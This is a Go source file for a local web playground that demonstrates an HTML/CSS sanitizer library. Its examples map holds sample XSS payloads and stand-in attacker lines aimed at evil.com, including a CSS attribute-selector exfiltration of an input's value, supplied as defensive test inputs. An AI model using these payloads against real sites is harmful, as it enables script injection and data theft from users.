// Command playground is a tiny HTTP server that exposes the
// sanitizer behind a friendly web UI. The HTML is embedded as
// a Go string to avoid HTML/JS escaping issues with the file
// formatter.
//
// Run with: go run ./cmd/playground
// Then open: http://localhost:8081
package main

import (
	"encoding/json"
	"flag"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent"
	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent/profiles"
)

// maxSanitizeBytes bounds the playground's request body. The
// sanitizer enforces its own per-field limits afterwards.
const maxSanitizeBytes = 2 << 20

type sanitizeRequest struct {
	HTML string `json:"html"`
	CSS  string `json:"css"`
}

type sanitizeResponse struct {
	SanitizedHTML string             `json:"sanitized_html"`
	SanitizedCSS  string             `json:"sanitized_css"`
	Report        usercontent.Report `json:"report"`
}

// addr is the playground's listen address. The playground is a
// local development tool; it has no configuration beyond this.
var addr = flag.String("addr", ":8081", "listen address")

func main() {
	flag.Parse()

	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		log.Fatalf("init sanitizer: %v", err)
	}

	// Encode examples to JSON and embed into the HTML.
	examplesJSON, err := json.Marshal(examples)
	if err != nil {
		log.Fatalf("encode examples: %v", err)
	}
	page := strings.Replace(pageHTML, "%EXAMPLES%", string(examplesJSON), 1)

	mux := http.NewServeMux()

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(page))
	})

	mux.HandleFunc("/api/sanitize", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		r.Body = http.MaxBytesReader(w, r.Body, maxSanitizeBytes)
		var req sanitizeRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
			return
		}
		html, hReport, err := s.SanitizeHTML(req.HTML)
		if err != nil {
			http.Error(w, "html: "+err.Error(), http.StatusBadRequest)
			return
		}
		css, cReport, err := s.SanitizeCSS(req.CSS)
		if err != nil {
			http.Error(w, "css: "+err.Error(), http.StatusBadRequest)
			return
		}
		report := hReport
		report.Removed = append(report.Removed, cReport.Removed...)
		report.OutputBytes = len(html) + len(css)
		report.Modified = len(report.Removed) > 0
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(sanitizeResponse{
			SanitizedHTML: html,
			SanitizedCSS:  css,
			Report:        report,
		})
	})

	log.Printf("playground listening on http://localhost%s", *addr)
	log.Printf("open in your browser to test the sanitizer")
	// ReadHeaderTimeout guards against slow-header clients even on a
	// local dev server.
	srv := &http.Server{Addr: *addr, Handler: mux, ReadHeaderTimeout: 10 * time.Second}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("listen: %v", err)
	}
}

// pageHTML is the playground HTML, embedded directly so the file
// formatter can't mangle it. The placeholder %EXAMPLES% is filled
// in at startup with a JSON-encoded list of examples.
const pageHTML = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Sanitizer Playground</title><style>
:root { --bg:#0f1115; --panel:#1a1d24; --border:#2d313a; --text:#e6e8ec; --muted:#8b919e; --accent:#4f8cff; --danger:#ff5c5c; --ok:#4ade80; }
* { box-sizing: border-box; }
body { margin:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:var(--bg); color:var(--text); line-height:1.5; }
header { padding:1rem 2rem; background:var(--panel); border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; }
header h1 { margin:0; font-size:1.1rem; font-weight:600; }
header .tag { color:var(--muted); font-size:0.85rem; }
main { display:grid; grid-template-columns:1fr 1fr 1fr; gap:1px; height:calc(100vh - 60px); background:var(--border); }
.panel { background:var(--bg); display:flex; flex-direction:column; overflow:hidden; }
.panel-header { padding:0.6rem 1rem; background:var(--panel); border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; font-size:0.85rem; color:var(--muted); gap:0.5rem; flex-wrap:wrap; }
.panel-header .name { color:var(--text); font-weight:600; }
textarea { flex:1; background:var(--bg); color:var(--text); border:0; padding:1rem; font-family:'SF Mono',Consolas,monospace; font-size:13px; line-height:1.5; resize:none; outline:0; }
.preview { flex:1; background:white; overflow:auto; padding:0; }
.preview iframe { width:100%; height:100%; border:0; background:white; }
.report { flex:1; background:var(--bg); color:var(--text); padding:1rem; font-family:'SF Mono',Consolas,monospace; font-size:12px; overflow:auto; white-space:pre-wrap; }
.actions { padding:0.6rem 1rem; background:var(--panel); border-top:1px solid var(--border); display:flex; gap:0.5rem; align-items:center; }
button { background:var(--accent); color:white; border:0; padding:0.5rem 1rem; border-radius:4px; cursor:pointer; font-size:0.85rem; font-weight:500; }
button:hover { opacity:0.9; }
button.secondary { background:var(--border); }
.examples { display:flex; gap:0.4rem; flex-wrap:wrap; }
.examples button { background:var(--border); padding:0.3rem 0.6rem; font-size:0.7rem; }
.status { color:var(--muted); font-size:0.8rem; margin-left:auto; }
.status.ok { color:var(--ok); }
.status.bad { color:var(--danger); }
.empty-hint { color:var(--muted); font-style:italic; padding:0.5rem 0; }
.item { padding:0.4rem 0.6rem; margin:0.2rem 0; border-left:3px solid var(--danger); background:rgba(255,92,92,0.1); border-radius:0 4px 4px 0; }
.item-tag { display:inline-block; color:var(--danger); font-weight:600; margin-right:0.5rem; }
.item-value { color:var(--text); font-family:'SF Mono',Consolas,monospace; word-break:break-all; }
.item-reason { color:var(--muted); font-size:0.85rem; margin-left:0.5rem; }
</style></head><body>
<header><h1>User-Content Sanitizer Playground</h1><span class="tag">paste HTML / CSS, see the sanitized output</span></header>
<main>
<section class="panel">
  <div class="panel-header"><span class="name">Input (HTML + CSS)</span><span class="examples" id="examples"></span></div>
  <textarea id="html" placeholder="HTML goes here..."></textarea>
  <textarea id="css" placeholder="CSS goes here..." style="border-top: 1px solid var(--border); height: 35%;"></textarea>
  <div class="actions">
    <button onclick="sanitize()">Sanitize</button>
    <button class="secondary" onclick="clearAll()">Clear</button>
    <span id="status" class="status">ready</span>
  </div>
</section>
<section class="panel">
  <div class="panel-header"><span class="name">Sanitized output (sandboxed iframe)</span></div>
  <div class="preview"><iframe id="preview" sandbox=""></iframe></div>
</section>
<section class="panel">
  <div class="panel-header"><span class="name">Sanitizer report</span></div>
  <div class="report" id="report"><div class="empty-hint">Click "Sanitize" to see what was removed.</div></div>
</section>
</main>
<script>
(function () {
  var HTML_EL = document.getElementById('html');
  var CSS_EL  = document.getElementById('css');
  var PREVIEW = document.getElementById('preview');
  var REPORT  = document.getElementById('report');
  var STATUS  = document.getElementById('status');
  var EX_BOX  = document.getElementById('examples');

  var EXAMPLES = %EXAMPLES%;

  Object.keys(EXAMPLES).forEach(function (name) {
    var b = document.createElement('button');
    b.textContent = name;
    b.onclick = function () { loadExample(name); };
    EX_BOX.appendChild(b);
  });

  window.loadExample = function (name) {
    var ex = EXAMPLES[name];
    if (!ex) return;
    HTML_EL.value = ex.html;
    CSS_EL.value = ex.css;
    sanitize();
  };

  window.clearAll = function () {
    HTML_EL.value = '';
    CSS_EL.value = '';
    sanitize();
  };

  function setStatus(text, klass) {
    STATUS.textContent = text;
    STATUS.className = 'status ' + (klass || '');
  }

  function template(renderedHTML, renderedCSS) {
    var css = renderedCSS || '';
    var body = renderedHTML || '<em>(empty)</em>';
    return '<!DOCTYPE html><html><head><meta charset="utf-8"><style>' + css + '</style></head><body>' + body + '</body></html>';
  }

  function renderReport(report) {
    REPORT.innerHTML = '';
    if (!report || !report.removed || report.removed.length === 0) {
      var ok = document.createElement('div');
      ok.className = 'empty-hint';
      ok.textContent = 'No removals. Output was safe as-is.';
      REPORT.appendChild(ok);
      return;
    }
    var summary = document.createElement('div');
    summary.style.marginBottom = '0.8rem';
    summary.style.color = 'var(--muted)';
    summary.textContent = 'Removed ' + report.removed.length + ' item(s):';
    REPORT.appendChild(summary);
    report.removed.forEach(function (rem) {
      var div = document.createElement('div');
      div.className = 'item';
      var tag = document.createElement('span');
      tag.className = 'item-tag';
      tag.textContent = rem.kind;
      var val = document.createElement('span');
      val.className = 'item-value';
      val.textContent = rem.value || '';
      var reason = document.createElement('span');
      reason.className = 'item-reason';
      reason.textContent = '(' + (rem.reason || '') + ')';
      div.appendChild(tag);
      div.appendChild(val);
      div.appendChild(reason);
      REPORT.appendChild(div);
    });
  }

  window.sanitize = function () {
    var html = HTML_EL.value;
    var css = CSS_EL.value;
    setStatus('sanitizing...');
    fetch('/api/sanitize', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({html: html, css: css})
    })
    .then(function (r) {
      if (!r.ok) { throw new Error('status ' + r.status); }
      return r.json();
    })
    .then(function (data) {
      var doc = template(data.sanitized_html, data.sanitized_css);
      PREVIEW.srcdoc = doc;
      renderReport(data.report);
      var n = (data.report && data.report.removed) ? data.report.removed.length : 0;
      setStatus('done. ' + n + ' thing(s) removed.', n > 0 ? 'ok' : '');
    })
    .catch(function (err) {
      setStatus('error: ' + err.message, 'bad');
    });
  };

  window.loadExample('script');
})();
</script></body></html>`

// examples is the set of curated attacks available as one-click
// buttons in the playground. The HTML/CSS strings are stored as
// raw strings; back-tick-delimited raw strings avoid needing to
// escape any character.
var examples = map[string]struct {
	HTML string `json:"html"`
	CSS  string `json:"css"`
}{
	"script": {
		HTML: "<h1>Hi</h1>\n<script>alert('XSS via script tag')</script>\n<p>after</p>",
		CSS:  "",
	},
	"javascript: URL": {
		HTML: `<a href="javascript:alert('XSS')">click me</a>`,
		CSS:  "",
	},
	"onclick/onerror": {
		HTML: `<img src="x" onerror="alert('XSS')">`,
		CSS:  "",
	},
	"iframe": {
		HTML: `<p>before</p><iframe src="https://evil.com"></iframe><p>after</p>`,
		CSS:  "",
	},
	"form": {
		HTML: `<form action="https://evil.com"><input name="x"><input type="submit"></form>`,
		CSS:  "",
	},
	"svg": {
		HTML: `<svg onload="alert('XSS')"><circle cx="50" cy="50" r="40"/></svg>`,
		CSS:  "",
	},
	"CSS at-import": {
		HTML: `<p>hello</p>`,
		CSS:  "@import url(\"https://evil.com/track.css\");\np { color: red; }",
	},
	"CSS expression()": {
		HTML: `<p>hello</p>`,
		CSS:  "p { width: expression(alert('XSS')); }",
	},
	"CSS exfiltration": {
		HTML: `<input value="secret" id="x">`,
		CSS: "input[value^=\"a\"]{background:url(\"https://evil.com/?c=a\")}\n" +
			"input[value^=\"s\"]{background:url(\"https://evil.com/?c=s\")}",
	},
	"meta refresh": {
		HTML: `<meta http-equiv="refresh" content="0;url=https://evil.com">`,
		CSS:  "",
	},
	"base hijack": {
		HTML: `<base href="https://evil.com"><p>relative link</p>`,
		CSS:  "",
	},
	"clean": {
		HTML: "<h1>Hello</h1>\n<p>This is a clean page.</p>",
		CSS:  "h1 { color: navy; }\np { font-family: sans-serif; }",
	},
}
